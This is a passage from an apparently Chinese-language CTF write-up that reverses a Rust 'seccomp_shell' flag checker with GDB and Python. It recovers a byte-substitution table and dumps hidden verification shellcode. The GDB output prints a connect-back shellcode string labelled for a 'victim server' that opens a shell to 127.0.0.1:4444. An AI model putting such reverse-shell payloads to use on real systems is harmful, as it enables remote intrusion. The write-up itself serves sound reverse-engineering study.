class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">└─$ gdb -q ./blade</span><br><span class="line">gef➤  starti</span><br><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x42E</span><br><span class="line">Breakpoint 1 at 0x55555556709e</span><br><span class="line">gef➤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line"><span class="comment"># ./shellcode</span></span><br><span class="line">[+] Connection established from 127.0.0.1:56514</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000055555556709e <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/s <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: <span class="string">&quot;\223\377;\330jd\237\n\331\f\354\263\302X\253\255\217&quot;</span>, &lt;incomplete sequence \340&gt;</span><br><span class="line">gef➤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0x93    0xff    0x3b    0xd8    0x6a    0x64    0x9f    0x0a</span><br><span class="line">0x5555555d63e8: 0xd9    0x0c    0xec    0xb3    0xc2    0x58    0xab    0xad</span><br><span class="line">0x5555555d63f0: 0x8f    0xe0    0x00    0x1e    0x2d    0x39    0x6b    0x6c</span><br><span class="line">0x5555555d63f8: 0x81    0xe1    0x5b    0xaf    0x9c    0x09    0x04    0xa0</span><br><span class="line">0x5555555d6400: 0x32    0x7e    0x79    0x03    0xcb    0x71    0x75    0x61</span><br><span class="line">0x5555555d6408: 0xfd    0xc1    0xef    0x2e    0x14    0x0b    0x66    0xca</span><br><span class="line">0x5555555d6410: 0xa4    0xa2    0xee    0x97    0x3a    0xb7    0x0f    0x86</span><br><span class="line">0x5555555d6418: 0x99    0x74    0xed    0xd2    0x02    0x1c    0xda    0xe2</span><br></pre></td></tr></table></figure></div>拿到加密的映射表了，但只有一部分。我們可以透過 GDB 的功能直接設定換位後加密前的 flag 為特定的值，然後重複直到建立完整的映射表，其中設特定值的部分也可以用 GDB 的 python API 來協助完成，做法如下：<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x3A7</span><br><span class="line">Breakpoint 1 at 0x555555567017</span><br><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x42E</span><br><span class="line">Breakpoint 2 at 0x55555556709e</span><br><span class="line">gef➤  python</span><br><span class="line">&gt;start_addr = gdb.parse_and_eval(<span class="string">&quot;<span class="variable">$rbx</span>&quot;</span>)</span><br><span class="line">&gt;bytes_to_write = bytes(range(64))</span><br><span class="line">&gt;gdb.selected_inferior().write_memory(start_addr, bytes_to_write)</span><br><span class="line">&gt;end</span><br><span class="line">gef➤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span><br><span class="line">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span><br><span class="line">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span><br><span class="line">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span><br><span class="line">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span><br><span class="line">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span><br><span class="line">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span><br><span class="line">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span><br><span class="line">gef➤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line">Breakpoint 2, 0x000055555556709e <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/64xb <span class="variable">$rbx</span></span><br><span class="line">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span><br><span class="line">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span><br><span class="line">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span><br><span class="line">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span><br><span class="line">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span><br><span class="line">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span><br><span class="line">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span><br><span class="line">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span><br></pre></td></tr></table></figure></div>上面的操作重複 <code>256/64 = 4</code> 次即可得到完整的加密映射表，用 python 來協助我們 parse string 還有建立映射：<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line">plain_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x00    0x01    0x02    0x03    0x04    0x05    0x06    0x07</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x08    0x09    0x0a    0x0b    0x0c    0x0d    0x0e    0x0f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x10    0x11    0x12    0x13    0x14    0x15    0x16    0x17</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x18    0x19    0x1a    0x1b    0x1c    0x1d    0x1e    0x1f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x20    0x21    0x22    0x23    0x24    0x25    0x26    0x27</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x28    0x29    0x2a    0x2b    0x2c    0x2d    0x2e    0x2f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x30    0x31    0x32    0x33    0x34    0x35    0x36    0x37</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x38    0x39    0x3a    0x3b    0x3c    0x3d    0x3e    0x3f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x40    0x41    0x42    0x43    0x44    0x45    0x46    0x47</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x48    0x49    0x4a    0x4b    0x4c    0x4d    0x4e    0x4f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x50    0x51    0x52    0x53    0x54    0x55    0x56    0x57</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x58    0x59    0x5a    0x5b    0x5c    0x5d    0x5e    0x5f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x60    0x61    0x62    0x63    0x64    0x65    0x66    0x67</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x68    0x69    0x6a    0x6b    0x6c    0x6d    0x6e    0x6f</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x70    0x71    0x72    0x73    0x74    0x75    0x76    0x77</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x78    0x79    0x7a    0x7b    0x7c    0x7d    0x7e    0x7f</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x80    0x81    0x82    0x83    0x84    0x85    0x86    0x87</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x88    0x89    0x8a    0x8b    0x8c    0x8d    0x8e    0x8f</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x90    0x91    0x92    0x93    0x94    0x95    0x96    0x97</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x98    0x99    0x9a    0x9b    0x9c    0x9d    0x9e    0x9f</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xa0    0xa1    0xa2    0xa3    0xa4    0xa5    0xa6    0xa7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xa8    0xa9    0xaa    0xab    0xac    0xad    0xae    0xaf</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xb0    0xb1    0xb2    0xb3    0xb4    0xb5    0xb6    0xb7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xb8    0xb9    0xba    0xbb    0xbc    0xbd    0xbe    0xbf</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xc0    0xc1    0xc2    0xc3    0xc4    0xc5    0xc6    0xc7</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xc8    0xc9    0xca    0xcb    0xcc    0xcd    0xce    0xcf</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0xd0    0xd1    0xd2    0xd3    0xd4    0xd5    0xd6    0xd7</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xd8    0xd9    0xda    0xdb    0xdc    0xdd    0xde    0xdf</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xe0    0xe1    0xe2    0xe3    0xe4    0xe5    0xe6    0xe7</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xe8    0xe9    0xea    0xeb    0xec    0xed    0xee    0xef</span></span><br><span class="line"><span class="string">0x5555555d6410: 0xf0    0xf1    0xf2    0xf3    0xf4    0xf5    0xf6    0xf7</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xf8    0xf9    0xfa    0xfb    0xfc    0xfd    0xfe    0xff</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">encrypted_string = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfb    0x7b    0x4e    0xbb    0x51    0x15    0x8d    0xdb</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xb0    0xac    0xa5    0x8e    0xaa    0xb2    0x60    0xeb</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x63    0x5c    0xde    0x42    0x2b    0xc6    0xa6    0x35</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x30    0x43    0xd6    0x5f    0xbd    0x24    0xb1    0xe3</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x8c    0xa7    0xd5    0x2a    0x7c    0x6d    0x8b    0x17</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9d    0x83    0xfe    0x69    0x10    0x59    0xa9    0x9e</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x0f    0x1c    0x66    0x97    0x5b    0x61    0xed    0xad</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xe0    0xda    0x27    0x06    0x25    0xdc    0x5e    0xe7</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0x41    0x32    0xd2    0xd9    0x8f    0xee    0xaf    0x03</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x93    0x3a    0x00    0xa2    0xe1    0xb3    0xec    0x81</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x9f    0xca    0x58    0xb7    0x79    0xfd    0x3b    0xa0</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x02    0x0c    0xcb    0xa8    0x80    0xc0    0x16    0x4d</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x2f    0x75    0x71    0x0a    0x04    0x39    0xff    0xc1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x9c    0xab    0xef    0xa4    0xd8    0xe2    0x14    0xc2</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x6c    0x64    0x1e    0x6b    0x7e    0x99    0x2e    0x09</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x0b    0x86    0x74    0x6a    0xc4    0x2d    0x4f    0xf9</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfa    0x94    0xb6    0x1f    0x89    0x6f    0x5d    0xe8</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0xea    0xb5    0x5a    0x65    0x88    0xc5    0x7f    0x77</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x11    0xcf    0xf1    0x1b    0x3f    0xf4    0x48    0x47</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0x12    0xe4    0xba    0xdf    0xe9    0x62    0x6e    0xb4</span></span><br><span class="line"><span class="string">0x5555555d6400: 0x96    0xcd    0x13    0x53    0x4b    0x28    0xd7    0xd1</span></span><br><span class="line"><span class="string">0x5555555d6408: 0x33    0xb8    0xe6    0x7a    0x2c    0x9b    0x29    0x44</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x52    0xf7    0x20    0xf2    0x31    0xd3    0xb9    0x40</span></span><br><span class="line"><span class="string">0x5555555d6418: 0xd0    0x34    0xf5    0x54    0x1a    0x01    0xa1    0x92</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">0x5555555d63e0: 0xfc    0x85    0x07    0xbe    0xdd    0xbc    0x19    0xf3</span></span><br><span class="line"><span class="string">0x5555555d63e8: 0x36    0xf6    0x72    0x98    0x4c    0x7d    0xc7    0xd4</span></span><br><span class="line"><span class="string">0x5555555d63f0: 0x45    0x4a    0x9a    0xc3    0x8a    0xe5    0x50    0x46</span></span><br><span class="line"><span class="string">0x5555555d63f8: 0xcc    0x68    0x76    0x67    0xc9    0x0e    0x3c    0x57</span></span><br><span class="line"><span class="string">0x5555555d6400: 0xf0    0x22    0xbf    0x26    0x84    0x0d    0x90    0xa3</span></span><br><span class="line"><span class="string">0x5555555d6408: 0xae    0x3d    0x1d    0xc8    0x91    0x05    0x87    0x70</span></span><br><span class="line"><span class="string">0x5555555d6410: 0x08    0x73    0x21    0x49    0x55    0x3e    0x37    0x23</span></span><br><span class="line"><span class="string">0x5555555d6418: 0x18    0x56    0xce    0x82    0x38    0x95    0x78    0xf8</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_memory_dump</span>(<span class="params">dump</span>):</span><br><span class="line">    bytes_list = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> dump.strip().split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">        parts = line.split(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(parts) &lt; <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        byte_strs = parts[<span class="number">1</span>].split()</span><br><span class="line">        <span class="keyword">for</span> byte_str <span class="keyword">in</span> byte_strs:</span><br><span class="line">            bytes_list.append(<span class="built_in">int</span>(byte_str.strip(), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> bytes_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain_bytes = parse_memory_dump(plain_string)</span><br><span class="line">encrypted_bytes = parse_memory_dump(encrypted_string)</span><br><span class="line"></span><br><span class="line">encryption_mapping = &#123;plain: encrypted <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br><span class="line">decryption_mapping = &#123;encrypted: plain <span class="keyword">for</span> plain, encrypted <span class="keyword">in</span> <span class="built_in">zip</span>(plain_bytes, encrypted_bytes)&#125;</span><br></pre></td></tr></table></figure></div>讚。到這邊我們已經可以完全模擬它對輸入的所有操作了。<br>不過有個大問題：這題是一個 flag checker，可是剛剛前面我們已經用 IDA 把 <code>verify()</code> 整個看過一遍也沒發現任何在檢查 flag 的部分，只看到他寫了 255 個 bytes 到一塊新的空間還有寫 64 個 bytes 到 <code>dest</code>，還有一些 TCP 的操作，但就不知道他後面在忙什麼QQ<br>後來看了其他人的 writeup 後發現原來寫入的 255 byets 是一段 shellcode，那這樣我們可以用 <code>pwntool.disasm</code> 來協助我們分析這段 shellcode，gogo。</li></ul><ol><li>Shellcode 2 Assembly</li></ol><ul><li>下斷點</li></ul><p>我們把斷點下在剛 call 完寫入 shellcode 的地方，然後因為前面剛 <code>alloc()</code> 一塊空間給 shellcode 所以位址就會在 $rax：</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000130B2                 call    _ZN5alloc7raw_vec19RawVec$LT$T$C$A$GT$11allocate_in17h9362616e9151d1f3E ; alloc::raw_vec::RawVec$LT$T$C$A$GT$::allocate_in::h9362616e9151d1f3</span><br><span class="line">.text:00000000000130B7                 mov     r14, rax</span><br><span class="line">.text:00000000000130BA                 mov     r15, rdx</span><br><span class="line">.text:00000000000130BD                 lea     rsi, unk_62B2B  ; src</span><br><span class="line">.text:00000000000130C4                 mov     edx, 0FFh       ; n</span><br><span class="line">.text:00000000000130C9                 mov     rdi, rax        ; dest</span><br><span class="line">.text:00000000000130CC                 call    cs:memcpy_ptr</span><br><span class="line">.text:00000000000130D2                 mov     [rsp+288h+memoryBuffer], r14</span><br></pre></td></tr></table></figure></div><p>也就是 <code>mov     [rsp+288h+memoryBuffer], r14</code>。</p><ul><li>GDB dump shellcode<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">gef➤  <span class="built_in">break</span> *_ZN13seccomp_shell5shell6verify17h898bf5fa26dafbabE + 0x462</span><br><span class="line">Breakpoint 4 at 0x5555555670d2</span><br><span class="line">gef➤  <span class="built_in">continue</span></span><br><span class="line">Continuing.</span><br><span class="line">&gt; server</span><br><span class="line">[!] SYS_socket and SYS_connect should be allowed</span><br><span class="line">server&gt; run</span><br><span class="line">[*] Run the following shellcode on the victim server:</span><br><span class="line"><span class="string">&quot;\xeb\x10\x31\xc0\x53\x5f\x49\x8d\x77\x10\x48\x31\xd2\x80\xc2\xff\x0f\x05\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5b\x48\x97\x68\x7f\x00\x00\x01\x66\x68\x11\x5c\x66\x6a\x02\x54\x5e\xb2\x10\xb0\x2a\x0f\x05\x4c\x8d\x3d\xc5\xff\xff\xff\x41\xff\xe7&quot;</span></span><br><span class="line">[*] Waiting <span class="keyword">for</span> connection on 127.0.0.1:4444</span><br><span class="line">[+] Connection established from 127.0.0.1:56746</span><br><span class="line">$ flag 1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#123;&#125;</span><br><span class="line"></span><br><span class="line">Breakpoint 4, 0x00005555555670d2 <span class="keyword">in</span> seccomp_shell::shell::verify::h898bf5fa26dafbab ()</span><br><span class="line">gef➤  x/255xb <span class="variable">$rax</span></span><br><span class="line">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span><br><span class="line">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span><br><span class="line">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span><br><span class="line">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span><br><span class="line">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span><br><span class="line">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span><br><span class="line">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    0x31</span><br><span class="line">0x5555555d6468: 0xf6    0x48    0xb9    0x3b    0x3b    0x6f    0xc3    0x63</span><br><span class="line">0x5555555d6470: 0x64    0xc0    0xaa    0x48    0xba    0x48    0x4c    0x0b</span><br><span class="line">0x5555555d6478: 0xc3    0x63    0x64    0xc0    0xaa    0x48    0x31    0xd1</span><br><span class="line">0x5555555d6480: 0x51    0x48    0xb9    0x8c    0x57    0x82    0x75    0xd6</span><br><span class="line">0x5555555d6488: 0xf8    0xa9    0x7d    0x48    0xba    0xa3    0x32    0xf6</span><br><span class="line">0x5555555d6490: 0x16    0xf9    0x88    0xc8    0x0e    0x48    0x31    0xd1</span><br><span class="line">0x5555555d6498: 0x51    0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f</span><br><span class="line">0x5555555d64a0: 0x05    0x48    0x97    0x31    0xc0    0x50    0x54    0x5e</span><br><span class="line">0x5555555d64a8: 0x6a    0x04    0x5a    0x0f    0x05    0x41    0x5d    0x6a</span><br><span class="line">0x5555555d64b0: 0x03    0x58    0x0f    0x05    0x31    0xf6    0x6a    0x6f</span><br><span class="line">0x5555555d64b8: 0x48    0xb9    0x59    0xe5    0x06    0x0c    0x2d    0xf6</span><br><span class="line">0x5555555d64c0: 0xd9    0x77    0x48    0xba    0x76    0x81    0x63    0x7a</span><br><span class="line">0x5555555d64c8: 0x02    0x8c    0xbc    0x05    0x48    0x31    0xd1    0x51</span><br><span class="line">0x5555555d64d0: 0x54    0x5f    0x6a    0x02    0x58    0x99    0x0f    0x05</span><br><span class="line">0x5555555d64d8: 0x48    0x97    0x31    0xc0    0x50    0x54    0x5e    0x6a</span><br><span class="line">0x5555555d64e0: 0x04    0x5a    0x0f    0x05    0x58    0x48    0xf7    0xd0</span><br><span class="line">0x5555555d64e8: 0x48    0xc1    0xe8    0x1d    0x48    0x99    0x6a    0x29</span><br><span class="line">0x5555555d64f0: 0x59    0x48    0xf7    0xf1    0x49    0x96    0x6a    0x03</span><br><span class="line">0x5555555d64f8: 0x58    0x0f    0x05    0xb8    0xef    0xbe    0xad    0xde</span><br><span class="line">0x5555555d6500: 0x44    0x01    0xe0    0x44    0x31    0xe8    0xc1    0xc8</span><br><span class="line">0x5555555d6508: 0x0b    0xf7    0xd0    0x44    0x31    0xf0    0x3d    0xef</span><br><span class="line">0x5555555d6510: 0xbe    0xad    0xde    0x75    0x05    0x6a    0x01    0x58</span><br><span class="line">0x5555555d6518: 0xeb    0x03    0x48    0x31    0xc0    0x50    0x53    0x5f</span><br><span class="line">0x5555555d6520: 0x54    0x5e    0x6a    0x08    0x5a    0x6a    0x01    0x58</span><br><span class="line">0x5555555d6528: 0x0f    0x05    0x55    0x5c    0x41    0xff    0xe7</span><br></pre></td></tr></table></figure></div></li><li>python 轉換成 assembly<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ===== Part 3: shellcode =====</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> disasm</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x5555555d6430: 0x54    0x5d    0x31    0xf6    0x48    0xb9    0xa1    0x57</span></span><br><span class="line"><span class="string">0x5555555d6438: 0x06    0xb8    0x62    0x3a    0x9f    0x37    0x48    0xba</span></span><br><span class="line"><span class="string">0x5555555d6440: 0x8e    0x35    0x6f    0xd6    0x4d    0x49    0xf7    0x37</span></span><br><span class="line"><span class="string">0x5555555d6448: 0x48    0x31    0xd1    0x51    0x54    0x5f    0x6a    0x02</span></span><br><span class="line"><span class="string">0x5555555d6450: 0x58    0x99    0x0f    0x05    0x48    0x97    0x31    0xc0</span></span><br><span class="line"><span class="string">0x5555555d6458: 0x50    0x54    0x5e    0x6a    0x04    0x5a    0x0f    0x05</span></span><br><span class="line"><span class="string">0x5555555d6460: 0x41    0x5c    0x6a    0x03    0x58    0x0f    0x05    